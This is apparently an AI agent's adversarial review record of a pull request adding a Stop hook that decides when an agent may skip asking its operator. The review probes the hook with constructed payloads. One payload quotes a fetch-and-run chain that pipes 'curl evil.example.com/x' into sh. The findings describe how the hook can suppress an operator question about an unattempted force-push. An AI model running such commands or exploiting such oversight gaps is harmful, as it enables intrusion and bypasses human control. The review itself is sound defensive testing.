---
issue: 3229
role: adversarial-review+silent-failure-audit+test-depth-audit-5aff12c5
author: adversarial-review+silent-failure-audit+test-depth-audit-5aff12c5
skills: adversarial-review (skill-repository(c05de12)), silent-failure-audit (skill-repository(c05de12)), test-depth-audit (skill-repository(c05de12))
verifies_subject: true
loop_state: landed
type: review
breaking: false
verdict: 2 Incorrect (crash direction, derivation/adjacency), 1 Surface (latency claim's generality), 4 Present (five must-not partitions, a sixth partition, blocking-path loop safety, the incidental hook_classification.json fix)
code_under_review: a7780e16a946b38106397c9b6fc5572f700a7013 (PR #3232, branch issue-3229/implementation-blueprint+silent-failure-audit+test-derivation-b3718614)
upstream:
  - path: PR #3232 (tokenmaxxxer/on-the-record)
    sha: a7780e16a946b38106397c9b6fc5572f700a7013
  - path: docs/issue-3229/reports/implementation-blueprint+silent-failure-audit+test-derivation-b3718614.md, as it exists on PR #3232's own branch (untracked on this branch -- this review's own record lives at a different path on this branch instead)
    sha: a7780e16a946b38106397c9b6fc5572f700a7013
---

# issue-3229 — adversarial-review+silent-failure-audit+test-depth-audit-5aff12c5 record

## What was done

Independent, hands-on adversarial verification of PR #3232's delegation-live-check.sh
Stop hook. Fetched PR #3232 into an isolated worktree at /tmp/pr3232-review
(commit a7780e16), then drove the real hook binary (`bash
on-the-record/hooks/delegation-live-check.sh` as it exists on that PR's
branch, plus its real registered `fail-open-wrapper.sh` wrapper as it
exists on this branch, unchanged by the PR for this purpose) via
subprocess against constructed Stop payloads written from scratch — not
by re-running the shipped test suite.
canonical: `git fetch origin pull/3232/head:pr-3232 && git worktree add
/tmp/pr3232-review pr-3232` (this session's own commands, exit 0); `git
diff main pr-3232 --stat` (this session's own command) — result: 10 files
changed, 940 insertions(+), 7 deletions(-), touching delegation_state.py,
on-the-record/hooks/{delegation-live-check.sh (new),hooks.json,hook_classification.json,fail-open-wrapper.sh,test_hook_classification.py},
docs/specs/{enforcement-boundary.md,generated-paths.md},
tests/test_issue_3229_delegation_live_wiring.py (new)

Everything below cites file:line locations as they exist **on PR #3232's
own branch** (worktree /tmp/pr3232-review, commit a7780e16) — those files
and line numbers are untracked/absent on this review's own branch, which
never checked PR #3232's changes out into its own working tree (per this
task's explicit instruction not to edit PR #3232).

**1. The five must-not partitions, driven with my own payloads (not the
shipped fixtures).** No manifest at all; an explicit empty manifest
(`grant(..., manifest=[])`, distinct from "no grant() ever called" — a
different AND-chain node); a malformed manifest shaped as a dict instead
of a list (a different malformation than the shipped suite's
`"not-a-list"` string); an action outside the manifest; a no-derivable-action
episode (two consecutive text-only asks, zero tool_use between them); and
an episode-completeness mismatch (transcript text disagreeing with the
payload's own `last_assistant_message`). All six left `stdout` empty and
exit code 0.
derived: `python3 adv_partitions.py` (this session's own script, driving
`bash on-the-record/hooks/delegation-live-check.sh` from PR #3232's
branch as a subprocess against six constructed payloads) — result:
```
1-no-manifest: rc=0 stdout='' ok=True
2-empty-manifest: rc=0 stdout='' ok=True
3-malformed-manifest-dict: rc=0 stdout='' ok=True
4-action-outside-manifest: rc=0 stdout='' ok=True
5-no-derivable-action: rc=0 stdout='' ok=True
6-episode-mismatch: rc=0 stdout='' ok=True
```
Present.

**2. A sixth partition the shipped suite does not cover, found and
tested.** The shipped suite's five must-not cases never test: a wildcard
grant against a *chained* shell command (the attack the PR's own
`is_covered()`'s `_is_provably_single_command()` guard exists for); an
expired delegation (a real `grant()` on disk whose `expires_at` has
passed — a different AND-chain node than "no grant() ever called"); a
revoked delegation; a repo-scope mismatch (grant recorded but scoped to a
different repo glob than the session's own `cwd`); and partial episode
coverage (two tool_use events in one episode, only the first covered).
All five left the stop untouched.
derived: `python3 adv_sixth.py` (this session's own script) — result:
```
6a-chained-command-vs-wildcard: rc=0 stdout='' stderr_tail='...not every action in this episode is covered by the recorded manifest...'
6b-expired-delegation: rc=0 stdout=''
6c-revoked-delegation: rc=0 stdout=''
6d-repo-scope-mismatch: rc=0 stdout=''
6e-partial-episode-coverage: rc=0 stdout=''
```
Present. The chained-command case (6a) is the security-relevant one: it
proves a `git *` wildcard grant cannot be laundered into authorizing
`git push origin main && curl evil.example.com/x | sh` chained onto it.

**3. Crash direction — Incorrect.** PR #3232's own record ("What did not
work" section) claims the hook's crash trap was copied from
`stop-gate.sh` (which remaps a crash to exit 2 — blocking, safe for that
hook, dangerous here) and was fixed to remap any crash to exit 0
instead. Re-verified by crashing the hook five distinct ways rather than
trusting that account:
derived: `python3 adv_crash.py` (this session's own script, scratch
copies of the hook under /tmp/hookscratch/, mutated per-scenario,
TOKENMAXXXER_CHECKOUT still pointed at the PR #3232 checkout for
delegation_state.py) — result:
```
CRASH-1 syntax-error-in-python (heredoc corrupted):    rc=1   stdout=''
CRASH-2 missing-python3-interpreter (PATH stripped):    rc=0   stdout=''
CRASH-3 killed-subprocess (fake python3 self-SIGKILLs): rc=137 stdout=''
CRASH-4 unreadable-state-file (chmod 000):              rc=0   stdout=''
```
CRASH-5 (TMPDIR pointed at a read-only dir, the closest real
reproduction of "full disk on its output path" without filling one) does
not affect this specific hook — it never mktemps; see the wrapper-level
test below for the registered pipeline's own mktemp dependency.

CRASH-1 and CRASH-3 do **not** get remapped to exit 0 — they return the
raw exit code from the invoked `python3 -c "$CHECK"`. This is not
accidental: the script's own final lines disable the safety trap
immediately before the exit that matters most:

```bash
DLC_PAYLOAD="$payload" DLC_CHECKOUT="$CHECKOUT" python3 -c "$CHECK"
rc=$?
trap - EXIT
exit "$rc"
```
canonical: on-the-record/hooks/delegation-live-check.sh lines 115-118, as
they exist on PR #3232's branch (`git show pr-3232:on-the-record/hooks/delegation-live-check.sh`,
this session's own read) — this exact text.

Both the `command -v python3 >/dev/null 2>&1 || exit 2` early guard
(line 60, reached *before* this disable) and the empty-`$CHECK` bail
(line 113, also before it) are correctly protected by the top-of-file
trap (line 56: `trap 'rc=$?; if [ "$rc" != 0 ]; then exit 0; fi' EXIT`) —
that is why CRASH-2 and the empty-heredoc case return 0. But the single
highest-risk line in the entire script — the actual `python3 -c "$CHECK"`
invocation — runs with that protection explicitly switched off one line
before its own exit.

In practice this does not currently cause a block, because nothing in
the shipped `$CHECK` program calls `sys.exit(2)` and a Python-level crash
(SyntaxError, uncaught exception, SIGKILL) exits 1 or 137, never
literally 2. But the hook's own header comment claims "exit 0 either
way: a hook that cannot run is a hook that does not fire" — false for
this code path — and the "defense-in-depth for a crash OUTSIDE python
entirely" framing does not hold either. Decisively reproduced the
dangerous direction by making the invoked python program itself exit
with the literal code 2 (`sys.exit(2)` inserted right after `import
delegation_state as ds` in a scratch copy, standing in for *any* future
crash path that happens to surface as exit code 2 — a C-level
interpreter fault, or a future edit to the heredoc that calls
`sys.exit()` with a nonzero argument for an unrelated reason), driven
through both the bare hook and the real registered `fail-open-wrapper.sh`:
derived: `python3 adv_crash2.py` (this session's own script) — result:
```
DECISIVE forced-exit-2-from-python:          rc=2  stdout=''
DECISIVE-via-wrapper forced-exit-2:          rc=2  stdout=''
WRAPPER positive-case TMPDIR-unwritable:     rc=0  stdout='{"decision": "block", ...}'  (unaffected -- confirms the wrapper's own mktemp-failure path degrades to a stdin pass-through rather than dropping the payload)
WRAPPER forced-exit2-case TMPDIR-unwritable: rc=2  stdout=''
```

Per PR #3232's own record ("What was done" item 1's live-tested table,
read from PR #3232's own docs/issue-3229/reports/implementation-blueprint+silent-failure-audit+test-derivation-b3718614.md
on its branch): `exit2 (stderr) -> result: 'CONTINUED' num_turns: 2 (2nd
payload fired: yes)` — a bare exit code 2 on a Stop event forces the
same-turn continuation exactly like `decision:"block"` does,
**independent of stdout**. So the one crash shape that matters is
precisely the one shape this hook's `trap - EXIT` (line 117) leaves
unprotected. Grading Incorrect, not Present: the record's claim is
stated as a completed fix without qualification, and the fix is
incomplete for exactly the invocation it was written to guard, even
though nothing in the current codebase reaches this path today.

**4. The derivation/adjacency defect — Incorrect, and the most severe
finding in this review.** Constructed a turn whose episode consists
entirely of two innocuous, manifest-covered actions (`git log --oneline
-20`, reading `CHANGELOG.md`), immediately followed by a text-only ask
about a completely different, dangerous, **never-attempted** action:
"The last three git log entries look suspicious. Should I force-push
origin main to roll the release branch back to the previous release
tag?" The force-push was never issued as a `tool_use` event — the
orchestrator is asking *before* attempting it, the single most common
real pattern for exactly the situations an operator wants to be
consulted about. The hook suppressed it:
derived: `python3 adv_derivation.py` (this session's own script) —
result:
```
ADJACENCY-PROBE: rc=0 stdout='{"decision": "block", "reason": "delegation-live-check: every action in this episode (Bash:\'git log --oneline -20\', Read:\'CHANGELOG.md\') is already covered by the recorded standing delegation ... -- proceed with the pending action without asking again. ..."}'
```

Why this happens: `_live_stop_decision_body()` (delegation_state.py line
919 on PR #3232's branch) checks `all(is_covered(a, manifest,
repo=repo_name) for a in episode_actions)` over `_previous_episode_boundary()`'s
stretch (delegation_state.py lines 869-883, same branch) — every
`tool_use` event between the prior ask and this one — and treats "every
action in that stretch was covered" as a proxy for "this ask is
redundant." Nothing ties the ask's actual subject to any member of that
stretch; adjacency (stream order) is the entire connection.
canonical: on-the-record/hooks/delegation-live-check.sh and
delegation_state.py as read from PR #3232's branch (`git show
pr-3232:delegation_state.py`, this session's own read, lines 774-801 and
869-919)

This is structurally the same confound `_episode_tool_uses()`'s own
docstring names for the *forward* direction on that same branch (lines
774-801, citing PR #3192 Q5: "an ordinary intervening action... that
happens to be individually covered can stand in for a later, genuinely
uncovered action that never gets checked"), which `audit()` defends
against with its own `all()`-over-the-whole-stretch check. That defense
does not transfer to the live/backward direction, and the two directions
are not symmetric: `audit()` runs *after* the episode finishes, so the
real action the ask was about (if the operator approved it) already
exists as a later `tool_use` event and gets checked for real.
`live_stop_decision()` runs *before* anything happens — a not-yet-attempted,
purely textual candidate action has no `tool_use` representation in
either direction, so there is nothing for the `all()` check to ever catch
it against. Grading Incorrect: this is not a rare edge case, it is the
canonical "ask before acting" pattern, and it demonstrates exactly the
operator-facing harm this review was asked to weight most heavily — a
question the operator should have been asked, silently answered
"proceed" instead.

**5. Blocking path / loop safety — Present.** Constructed a covered
episode, ran it once with `stop_hook_active=False` (blocks, as expected),
then ran the identical payload again with `stop_hook_active=True`
(simulating the forced-retry turn issue #1725's contract produces). The
retry fire left the stop untouched.
derived: `python3 adv_loop.py` (this session's own script) — result:
```
LOOP first-fire (stop_hook_active=False): stdout={"decision": "block", ...}
LOOP retry-fire (stop_hook_active=True):  rc=0 stdout=''
```
Present — the `stop_hook_active` check (checked first, before any other
work, per the hook's own header comment) correctly prevents a
self-forced retry from re-suppressing, so a covered action resolves
after exactly one forced continuation, not a hang.

**6. Latency — Surface.** Re-measured independently (30 real invocations
per scenario, not reusing PR #3232's own 100-call numbers) across four
scenarios instead of the tested trivial case alone.
derived: `python3 adv_latency.py` (this session's own script) — result:
```
no-grant (trivial baseline):                              avg=40.4ms p95=45.0ms
large-manifest (2000 entries) + small transcript:          avg=126.9ms p95=150.0ms
small-manifest + long transcript (~1600 events):            avg=41.1ms p95=46.5ms
large-manifest (2000) + long-transcript (~1600 events):     avg=127.3ms p95=137.4ms
```

PR #3232's measured ~38ms figure and its "both dominated by python3
interpreter startup" explanation hold for the no-grant path and for a
long transcript with a small manifest — confirmed independently, within
noise of its own 100-call measurement. They do **not** hold for a large
manifest: latency roughly triples (a ~87ms increase over the ~40ms
baseline, both figures from the same derived: run above), because
`is_covered()` (delegation_state.py line 677 on PR #3232's branch)
re-validates the whole manifest via `_safe_manifest()` (same file, line
453) — called once directly in `_live_stop_decision_body()` and again
inside `is_covered()` itself for every action checked — rather than
validating once and reusing the validated list: an O(manifest size)
cycle-detecting walk done at least twice per invocation regardless of
episode size, not the transcript walk. 2000 entries is not a realistic
size for a hand-authored "go ahead" grant, so this does not currently
violate the issue's "must not add latency the operator can feel" for
ordinary use — grading Surface, not Incorrect: the specific numbers
reported by PR #3232 are accurate for what it tested, but the general
claim is stated without the scoping it needs.

**7. The incidental hook_classification.json/fail-open-wrapper.sh fix
for amends-landing-apply.sh — Present, and confirmed not to change when
that hook fires.**
canonical: `git diff main pr-3232 -- on-the-record/hooks/hooks.json`
(this session's own command) — result: no hunk touches
`amends-landing-apply.sh`'s own `PostToolUse` registration; it was
already live before this PR. Only its `hook_classification.json` entry
(previously missing entirely) and its membership in
`fail-open-wrapper.sh`'s visible-degraded-notice case list were added.
derived: `python3 -m pytest on-the-record/hooks/test_hook_classification.py -q`
(this session's own run, in the PR #3232 checkout) — result: 6 passed

**Acceptance checks and full suites, run in the PR #3232 checkout:**
derived: this session's own five pytest runs in /tmp/pr3232-review —
result:
```
python3 -m pytest tests/test_issue_3229_delegation_live_wiring.py -q  -> 14 passed
python3 -m pytest test/test_delegation_state.py -q                    -> 92 passed
python3 -m pytest on-the-record/hooks/test_hook_classification.py -q  -> 6 passed
python3 -m pytest tests/ -q                                           -> 554 passed, 2 warnings
python3 -m pytest test/ -q                                            -> 657 passed, 3 xfailed
```
Matches PR #3232's own claimed counts; the 2 warnings are a pre-existing,
unrelated pinned-fixture-divergence notice (skill-candidates regression
harness), not caused by this PR.

**Test-depth audit, tests/test_issue_3229_delegation_live_wiring.py as
it exists on PR #3232's branch, derived: `grep -n "def test_"
tests/test_issue_3229_delegation_live_wiring.py` in the PR #3232
checkout (this session's own command)** — result:
```
14 matching lines, one per test method -- matches the 14-passed count from the acceptance-check pytest run above.
```

Classification: 13 of these 14 carry a genuine, falsifiable assertion
(exit code plus stdout/stderr content on a real subprocess run) —
Genuine Assertion, high verification density. The remaining one,
`test_real_captured_field_set_is_what_this_suite_builds_payloads_from`
(class `RealPayloadShapeTest`), is near-vacuous: it asserts hardcoded
facts about the test file's own `REAL_STOP_PAYLOAD_FIELDS` constant
against itself, never exercising the hook.
canonical: on-the-record's PR #3232 branch, tests/test_issue_3229_delegation_live_wiring.py
lines 154-160 (`git show pr-3232:tests/test_issue_3229_delegation_live_wiring.py`,
this session's own read)

The suite's real gap is a behavioral coverage gap, not a shallow-assertion
one: the crash-handling test (class `InternalCrashDeclinesRatherThanBlocksTest`,
same file lines 344-372, same read) mocks `trajectory_analyzer.parse_session_log`
and calls `ds.live_stop_decision()` **directly at the Python layer** — it
proves the internal try/except works, but never drives a crash through
the real subprocess/shell-trap boundary. That is exactly the boundary
where finding 3 above lives (the `trap - EXIT` at delegation-live-check.sh
line 117 on that same branch); no test in the suite would fail if that
line were never added or were reverted. The latency test (class
`LatencyTest`, same file lines 374-407, same read) bounds at 2.0s against
a measured ~38ms figure — a 50x regression (per the same derived: latency
runs above, e.g. 127ms vs. the bound) would still pass, so it is a
liveness smoke test, not a regression catcher, and per finding 6 it only
exercises the no-grant path.

## Why

Independent evaluator per the adversarial-review skill: this session did
not build PR #3232 (a different session/branch did), so there is no
self-review conflict to break. Weighted the investigation toward the one
way this change can do real harm — suppressing a question the operator
should have been asked — over cosmetic issues; findings 3 and 4 are both
concrete, reproduced instances of exactly that harm (one latent, one live
and readily triggered by a common interaction pattern), which is why they
are graded Incorrect rather than Surface despite both being narrow in
their currently-reachable trigger conditions.

Constructed fresh payloads throughout rather than re-running
tests/test_issue_3229_delegation_live_wiring.py, per this task's explicit
instruction and because re-running shipped tests cannot surface a defect
the shipped tests do not already check for.

## What did not work

None — every probe ran to completion and produced a decisive answer (six
did surface real defects; that is the review doing its job, not a
mechanical failure).

## Upstream basis

- PR #3232 (tokenmaxxxer/on-the-record), commit a7780e16 on branch
  issue-3229/implementation-blueprint+silent-failure-audit+test-derivation-b3718614
  — the deliverable this record reviews.
- docs/issue-3229/reports/implementation-blueprint+silent-failure-audit+test-derivation-b3718614.md,
  as it exists on PR #3232's own branch — the builder's own record, read
  in full for its claims (the seam experiment, the crash-trap "what did
  not work" narrative, the latency table), each independently re-tested
  above rather than taken on trust.
- Issue #3061 (delegation_state.py's own history) and PR #3220's tenth
  verification, read via `gh issue view 3229` / `gh issue view 3229
  --comments` (this session's own commands), for the gap this issue and
  PR #3232 both describe.

## Open findings

- **Crash direction (finding 3):** on-the-record/hooks/delegation-live-check.sh
  lines 115-118 on PR #3232's branch disable the script's own safety trap
  (`trap - EXIT`) immediately before the one exit that matters most.
  Currently unreachable in practice (no shipped code path exits the
  invoked python program with code 2), but latent and untested.
  Resolution path: remove the `trap - EXIT` before the final `exit
  "$rc"` (or replace the final three lines with a single `exit "$rc"`
  left under the still-active top-of-file trap, so ANY nonzero `rc` —
  including a stray 2 — remaps to 0 the same as every earlier exit point
  already does), and add a subprocess-level test that forces the invoked
  python program itself to exit 2 (not just mocks the internal function)
  so a regression here is caught by CI. Not fixed in this record — this
  session's task was verification only, explicitly instructed not to
  edit PR #3232.
- **Derivation/adjacency (finding 4):** `live_stop_decision()`
  (delegation_state.py line 919 on PR #3232's branch) cannot distinguish
  "the preceding episode's actions are what this ask is about" from "the
  preceding episode is unrelated prior work that happens to sit
  immediately before this ask in stream order." No structural fix is
  obvious from this review alone — the module's own docstring states the
  same open question for the forward direction ("bridging an operator's
  free-text... into a manifest... without inventing an unrequested
  guess... is an open question this module does not resolve on its
  own," same file lines 23-61, same branch) — flagging for the issue
  owner rather than proposing a fix un-warranted by this session's scope.
  Resolution path: either narrow the live check to only suppress when
  the ask's own text names a resource that itself parses as a covered
  action (a stronger, harder-to-satisfy binding than adjacency), or
  accept the current adjacency-based design with the risk named
  explicitly in the module's own comments (it currently is not named
  there at all).
- **Latency claim generality (finding 6):** `is_covered()`
  (delegation_state.py line 677 on PR #3232's branch) re-validates the
  whole manifest via `_safe_manifest()` on every call rather than once
  per `live_stop_decision()` invocation — cheap to fix (validate once,
  pass the validated list through), out of this review's own scope to
  apply.
- Findings 1, 2, 5, 7 need no follow-up — verified correct as shipped.

## Next steps

loop_state: landed. This record is the terminal deliverable for this
review; no further action from this session. The two Incorrect findings
(crash direction, derivation/adjacency) are handed to the issue owner via
this record and the PR review, not fixed here per this task's explicit
instruction not to edit PR #3232.

skill-verdict: adversarial-review — applied: invoked; structural
independence already held (this session did not build PR #3232), used
the skill's blindness-to-intent framing to drive constructed payloads
rather than re-running the builder's own tests (per the skill's Step 1
gate: an artifact bundle should not lean on the builder's own claims),
and its "the more real problems found, the better a report" framing to
prioritize findings 3 and 4 over cosmetic ones
skill-verdict: silent-failure-audit — applied: invoked; traced the
crash-direction claim (finding 3) from the catch site
(`live_stop_decision()`'s internal `except Exception`, delegation_state.py
lines 886-917 on PR #3232's branch) forward to the shell-level exit path
(delegation-live-check.sh lines 115-118, same branch) and found the
forward trace does not terminate in the claimed "exit 0 either way" — an
S-classified (Silently Absorbed in the dangerous direction, once forced
to exit 2) gap this review's finding 3 documents
canonical: on-the-record/hooks/delegation-live-check.sh lines 115-118 and
delegation_state.py lines 886-917, both read from PR #3232's branch (`git
show pr-3232:...`, this session's own reads)
skill-verdict: test-depth-audit — applied: invoked; classified all 14
tests in tests/test_issue_3229_delegation_live_wiring.py (PR #3232's
branch), found 13 Genuine-Assertion / 1 near-vacuous, and the suite's one
real behavioral coverage gap (subprocess-level crash never driven, only
the internal function mocked) — the same seam finding 3's defect lives in
